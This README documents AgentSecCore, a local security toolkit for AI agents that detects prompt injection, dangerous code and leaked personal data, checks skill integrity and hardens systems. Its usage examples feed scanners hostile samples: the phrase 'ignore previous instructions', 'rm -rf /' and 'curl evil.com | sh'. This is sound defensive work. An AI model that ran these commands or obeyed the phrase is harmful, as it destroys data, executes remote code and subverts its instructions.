# AgentSecCore

AgentSecCore is an all-local security kernel for AI Agents. It runs entirely on the local machine with zero Token consumption, providing defense-in-depth: prompt injection detection, code scanning, skill integrity verification, PII detection, system hardening, and sandbox isolation.

## Overview

| Module | Description |
|--------|-------------|
| Prompt Scanner | Rule engine + ML classifier detecting prompt injection and jailbreak (4 modes: fast/standard/strict/multi_turn) |
| Code Scanner | Static analysis of bash/python code for dangerous operations (verdict: pass/warn/deny/error) |
| Skill Ledger | Ed25519-signed integrity tracking with 6-state lifecycle (pass/none/drifted/warn/deny/tampered) |
| PII Checker | Detects personal information and credentials in text (email, phone, ID, JWT, AccessKey, etc.) |
| Security Baseline | System hardening scan and remediation via loongshield backend |
| Sandbox | Syscall-level isolation for cosh command execution (seccomp + namespace) |
| Observability | Interactive event review with 4-level drill-down TUI |
| Security Events | Local event store for querying and aggregating security findings |

## Prerequisites

- Linux x86_64 or aarch64 for source and RPM installations
- Linux x86_64 with system mode for the ANOLISA raw package
- Python 3.11.6 (pinned)
- ANOLISA CLI 0.2.17 or later
- Root privileges for system-mode install

## Installation

Update the CLI through its installation owner, then install the component in
system mode:

```bash
# CLI installed by get.agentic-os.sh
anolisa update self

# RPM-owned CLI
sudo anolisa update self

sudo anolisa --install-mode system install sec-core
sudo anolisa status sec-core
agent-sec-cli --version
```

`sec-core` is the ANOLISA component name. The RPM keeps its existing package
name, `agent-sec-core`:

```bash
sudo yum install anolisa agent-sec-core
sudo anolisa --install-mode system adopt sec-core
```

Installing the CLI from YUM makes it available on sudo's system path. Adoption
records the RPM in system state so the adapter manager can read the installed
component contract.

Developers building from source should use the repository-level entry point:

```bash
./scripts/build-all.sh --component sec-core
```

The source build installs the runtime and integration resources in user paths,
but it does not register `sec-core` in ANOLISA state. Do not follow it with
`anolisa adapter enable`; use the source integration scripts documented below.

## Quick Start

```bash
# System hardening scan
agent-sec-cli harden --scan --config agentos_baseline

# Scan code for security issues
agent-sec-cli scan-code --code 'rm -rf /' --language bash

# Prompt injection detection
agent-sec-cli scan-prompt --mode standard --text "ignore previous instructions"

# PII detection
agent-sec-cli scan-pii --text "Contact alice@example.com, card 4111111111111111"

# Skill integrity check
agent-sec-cli skill-ledger check /path/to/skill

# Security event summary
agent-sec-cli events --summary --last-hours 24
```

## Usage

### Prompt Scanner

Detects prompt injection, jailbreak, and malicious instructions. Uses rule engine (L1) + ML classifier (L2).

**Modes:**

| Mode | Layers | Latency | Use Case |
|------|--------|---------|----------|
| `fast` | L1 only | <5ms | Real-time chat |
| `standard` | L1+L2 | 20-80ms | Production (default) |
| `strict` | L1+L2+L3 | 50-200ms | High-security |
| `multi_turn` | L4 only | varies | Multi-turn intent detection (Ollama) |

```bash
# Standard scan (default mode)
agent-sec-cli scan-prompt --text "user input here"

# Fast mode (rules only)
agent-sec-cli scan-prompt --mode fast --text "user input"

# Multi-turn detection (JSON from stdin)
echo '{"history":[...],"current_query":"...","assistant_response":"..."}' | \
    agent-sec-cli scan-prompt --mode multi_turn

# From file (one prompt per line)
agent-sec-cli scan-prompt --input prompts.txt --format json

# Human-readable output
agent-sec-cli scan-prompt --text "hello" --format text

# Pre-download ML models (run once after install)
agent-sec-cli scan-prompt warmup
```

Model source: models are downloaded from ModelScope (Llama-Prompt-Guard-2-86M). Run `scan-prompt warmup` once after installation to eliminate cold-start latency.

#### Host hook policy

Set `PROMPT_SCANNER_HOOK_ENABLED=false` to skip prompt scanner hooks entirely. When enabled, the
following variables override capability configuration:

| Environment variable | Default | Behavior |
|----------------------|---------|----------|
| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | Set to `false` to short-circuit the hook before input is read |
| `PROMPT_SCANNER_MODE` | `observe` | `observe` audits silently; `warn` warns; `ask`/`block` enforce or fall back to `warn`; `deny` maps to `block` |
| `PROMPT_SCANNER_SCAN_MODE` | `standard` | Scan strength: `fast` / `standard` / `strict` |
| `PROMPT_SCANNER_TIMEOUT` | `10` | Scanner timeout in seconds |

See the [Prompt Scanner User Guide](prompt-scanner.md) for full CLI options, verdict semantics, and
Security Event details.

### Code Scanner

Detects dangerous operations in bash and python code. Verdict enum: `pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or `pass`.

```bash
# Scan bash code (default language)
agent-sec-cli scan-code --code 'rm -rf /'

# Scan python code
agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python

# Use LLM engine (requires model backend)
agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
```

For per-agent hook environment variables and supported interaction modes, see [Code Scanner Hook Configuration](code-scanner.md).

### Skill Ledger

OS-level skill integrity tracking with Ed25519 signatures and append-only version chain.

**States:**

| State | Meaning | Action |
|-------|---------|--------|
| pass | Files unchanged, signature valid, scan clean | Safe to use |
| none | Never scanned | Run `scan` or `certify` |
| drifted | Files changed since last certification | Re-scan |
| warn | Scan found low-risk issues | Review findings |
| deny | Scan found high-risk issues | Fix or disable |
| tampered | Signature verification failed | Security incident |

```bash
# Initialize keys and baseline scan
agent-sec-cli skill-ledger init

# Check integrity (no modification)
agent-sec-cli skill-ledger check /path/to/skill
agent-sec-cli skill-ledger check --all

# Run built-in scanners and sign
agent-sec-cli skill-ledger scan /path/to/skill
agent-sec-cli skill-ledger scan --all

# Import external findings
agent-sec-cli skill-ledger certify /path/to/skill \
    --findings /tmp/findings.json --scanner skill-vetter

# System health overview
agent-sec-cli skill-ledger status
agent-sec-cli skill-ledger status --verbose

# Audit version chain integrity
agent-sec-cli skill-ledger audit /path/to/skill --verify-snapshots

# List registered scanners
agent-sec-cli skill-ledger list-scanners

# Apply user decision
agent-sec-cli skill-ledger decide /path/to/skill --action allow

# Show latest active state
agent-sec-cli skill-ledger show /path/to/skill

# Export signed snapshot for review
agent-sec-cli skill-ledger export /path/to/skill --output /tmp/export/
```

### PII Checker

Detects personal information and credentials in text input.

```bash
# Scan text directly
agent-sec-cli scan-pii --text "Contact alice@example.com" --source manual

# Scan from stdin
echo "my key is AKID1234567890" | agent-sec-cli scan-pii --stdin --format json

# Scan from file
agent-sec-cli scan-pii --input ./sample.log --source user_input

# With redacted output
agent-sec-cli scan-pii --text "card 4111111111111111" --redact-output

# Include low-confidence findings
agent-sec-cli scan-pii --text "some text" --include-low-confidence
```

#### Qwen Code integration

The Qwen Code extension scans user prompts, tool inputs, successful and failed tool
outputs, and final model output. It is enabled in observe-only, fail-open mode by
default; raw scan content is passed to `scan-pii` only through stdin, and notices use
only redacted evidence.

```bash
# Enable the extension, then start Qwen Code with blocking enabled
anolisa adapter enable sec-core qwencode
PII_CHECKER_MODE=block qwen
```

| Environment variable | Default | Behavior |
|----------------------|---------|----------|
| `PII_CHECKER_HOOK_ENABLED` | `true` | Set to `false` to skip the PII hook before input is read |
| `PII_CHECKER_MODE` | `observe` | `observe` audits silently; `warn` warns; `ask`/`block` use host-specific enforcement or fallback; `debug` aliases `observe`, and `deny` aliases `block` |
| `PII_CHECKER_ENABLED` | - | Legacy Qwen-only enabled variable, used when the new switch is absent |
| `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | Passes `--include-low-confidence` when enabled |
| `PII_CHECKER_TIMEOUT` | `5` | Scanner timeout in seconds, capped at 8 seconds |

User prompts and tool inputs can be stopped before execution. For a successful tool call,
`PostToolUse` runs after side effects have occurred, but Qwen Code 0.19.9 consumes
`continue:false` and converts the normal result into a hook-stopped error before downstream
handling. It cannot undo the tool's side effects. `PostToolUseFailure` does not consume
blocking fields in that version, so failed outputs are scan-and-audit only and remain in the
existing error flow. A denied final model output receives one rewrite attempt; a repeated
`Stop` hook is not blocked again, preventing retry loops. Qwen Code does not currently
provide a pre-render output replacement hook, so model-output blocking is best effort.

### Security Baseline

System hardening via `agent-sec-cli harden` (wraps loongshield seharden on Alinux).

```bash
# Compliance scan (default: agentos_baseline profile)
agent-sec-cli harden --scan --config agentos_baseline

# Preview remediation (dry run)
agent-sec-cli harden --reinforce --dry-run --config agentos_baseline

# Execute remediation (requires root)
agent-sec-cli harden --reinforce --config agentos_baseline

# OpenClaw-specific baseline
agent-sec-cli harden --scan --level openclaw

# Show full downstream help
agent-sec-cli harden --downstream-help
```

### Observability

Interactive event review tool for auditing Agent behavior.

The OpenClaw, Hermes, cosh, Qwen Code, Qoder, and Codex integrations enable
their observability hooks by default. To disable hook recording, set
`OBSERVABILITY_HOOK_ENABLED=false` before starting the host and restart the host
after changing it. The variable accepts only `true` / `false` (ignoring case and
surrounding whitespace); an unset or invalid value keeps recording enabled.

For OpenClaw and Hermes, the existing observability capability `enabled` setting
is an independent gate. Either switch can disable recording;
`OBSERVABILITY_HOOK_ENABLED=true` does not override a capability disabled in
plugin configuration.

```bash
export OBSERVABILITY_HOOK_ENABLED=false
```

```bash
# Open interactive TUI (requires interactive terminal)
agent-sec-cli observability review

# Record an observability event (from plugin, via stdin)
echo '{"hook":"before_tool_call",...}' | agent-sec-cli observability record --stdin

# Print observability record JSON schema
agent-sec-cli observability schema

# Per-session debrief report
agent-sec-cli observability report --last
agent-sec-cli observability report --session-id <id> --format json
```

### Security Events

Query the local security event store.

```bash
# Recent events (table format, default)
agent-sec-cli events --last-hours 24

# JSON output
agent-sec-cli events --last-hours 24 --output json

# Filter by category
agent-sec-cli events --category prompt_scan

# Filter by time range
agent-sec-cli events --since 2026-01-01T00:00:00 --until 2026-01-02T00:00:00

# Count events
agent-sec-cli events --count --last-hours 24

# Breakdown by category
agent-sec-cli events --count-by category --last-hours 24

# Pagination
agent-sec-cli events --offset 50 --limit 20

# Security posture summary
agent-sec-cli events --summary
```

## Agent Framework Integration

For an ANOLISA-managed raw package or an adopted RPM, installation places the
available adapters but does not change an agent framework's user configuration.
Run adapter commands as the user who owns that framework's configuration:

```bash
anolisa adapter scan
anolisa adapter enable sec-core openclaw
```

Replace `openclaw` with `hermes`, `qwencode`, `cosh`, `codex`, or `qoder` for
the other packaged integrations.

### Source-build Integration

The default source build installs the cosh extension directly under
`~/.copilot-shell/extensions/agent-sec-core`, so no separate cosh enable step
is needed. Deploy another integration with its installed user-path script:

```bash
# OpenClaw
bash ~/.local/lib/anolisa/sec-core/openclaw-plugin/scripts/deploy.sh

# Hermes
bash ~/.local/lib/anolisa/sec-core/hermes-plugin/scripts/deploy.sh

# Qwen Code
bash ~/.local/lib/anolisa/sec-core/qwen-code-extension/scripts/deploy.sh

# Codex
bash ~/.local/lib/anolisa/sec-core/codex-plugin/install.sh

# Qoder
bash ~/.local/lib/anolisa/sec-core/qoder-plugin/install.sh
```

### OpenClaw

Enable the adapter with ANOLISA:

```bash
anolisa adapter enable sec-core openclaw
```

After deployment, configure:

```bash
# Enable prompt scan blocking
openclaw config set plugins.entries.agent-sec.config.promptScanBlock true

# Enable code scan approval mode
openclaw config set plugins.entries.agent-sec.config.codeScanRequireApproval true

# Restart gateway to load
openclaw gateway restart
```

### Hermes

Enable the adapter with ANOLISA:

```bash
anolisa adapter enable sec-core hermes
```

Plugin config at `~/.hermes/plugins/agent-sec-core-hermes-plugin/config.toml`:

```toml
[capabilities.code-scan]
enabled = true
timeout = 10
enable_block = false    # false=observe, true=block

[capabilities.pii-scan-user-input]
enabled = true
timeout = 10

[capabilities.prompt-scan-user-input]
enabled = true
timeout = 10
enable_block = false    # false=observe, true=block

[capabilities.skill-ledger]
enabled = true
timeout = 5
policy = "ask"          # observe | warn | ask (default) | block
```

### Qwen Code

Enable the user-scoped extension with ANOLISA:

```bash
anolisa adapter enable sec-core qwencode
```

The synchronous `PreToolUse` hook protects only model-triggered Qwen Code
`skill` Tool calls for managed project (`.qwen/skills`) and user
(`$QWEN_HOME/skills`, defaulting to `~/.qwen/skills`) skills. Scan or certify
each skill first; these commands best-effort add its directory to
`managedSkillDirs`:

```bash
agent-sec-cli skill-ledger scan .qwen/skills/<skill>
agent-sec-cli skill-ledger scan "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
agent-sec-cli skill-ledger show .qwen/skills/<skill>
agent-sec-cli skill-ledger show "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
```

`show` returns `managed=false` only for an unmanaged Skill; a normal exposure
summary without that marker is managed. Unmanaged skills always fail open,
including when blocking is enabled. The default policy is `ask`; set the policy
in the trusted environment that starts Qwen Code:

```bash
SKILL_LEDGER_MODE=observe qwen  # observe only
SKILL_LEDGER_MODE=warn qwen   # emit a non-blocking diagnostic; continue
SKILL_LEDGER_MODE=ask qwen    # ask before use (default)
SKILL_LEDGER_MODE=block qwen  # deny a non-empty exposure warning
```

Qwen Code 0.19.9 records non-blocking `systemMessage` values in the session debug log
but does not render them in its TTY; native `permissionDecision=ask/deny` and
enforceable `block` decisions are unaffected.

The hook follows the existing Skill Ledger exposure message, including prior
`decide` actions. Normal `pass` and `warn` states are allowed; managed `none`,
`drifted`, `deny`, and `tampered` states can warn, ask, or block when their
exposure message is non-empty. `ask` falls back to denial in Qwen Code contexts
that cannot prompt, such as headless runs and background subagents.

Only disk skills that Qwen Code exposes to the model enter Ledger validation.
A disk skill hidden by `disable-model-invocation` or `skills.disabled` fails
open so its Ledger state cannot block a same-named file command or MCP prompt.
Unreadable or invalid Qwen settings also fail open because the public hook input
does not identify the final dispatch source.

The protection boundary intentionally excludes direct `/skill-name` and stacked
slash-skill expansion, extension skills, `.agents/skills`, bundled skills, and
symlinks whose targets leave the corresponding `.qwen/skills` root. Missing CLI
or keys, initialization failure, inaccessible or ambiguous paths or settings,
timeouts, and invalid output are diagnosed and fail open. There is no startup
preflight, background scan, cache, or automatic configuration repair.

### Copilot Shell (cosh)

For a package install, enable the adapter in the target user's configuration:

```bash
anolisa adapter enable sec-core cosh
```

Hooks are loaded when cosh starts.

Extension path:
- User install: `~/.copilot-shell/extensions/agent-sec-core/`
- RPM install: `/usr/share/anolisa/extensions/agent-sec-core/`

## FAQ

**Q: Does AgentSecCore consume Tokens?**

A: No. All processing is local. No external API calls, no Token cost.

**Q: What is the difference between `harden` and `loongshield`?**

A: `agent-sec-cli harden` is the ANOLISA unified entry point that wraps `loongshield seharden` with default configuration. On Alinux systems, both work; `harden` adds the `agentos_baseline` profile by default.

**Q: How do I update the ML model for prompt scanning?**

A: Run `agent-sec-cli scan-prompt warmup` again. It downloads the latest model from ModelScope.

**Q: What does Skill Ledger `tampered` mean?**

A: Files are unchanged but the digital signature verification failed — the manifest metadata itself may have been modified. Stop using the skill immediately and investigate.
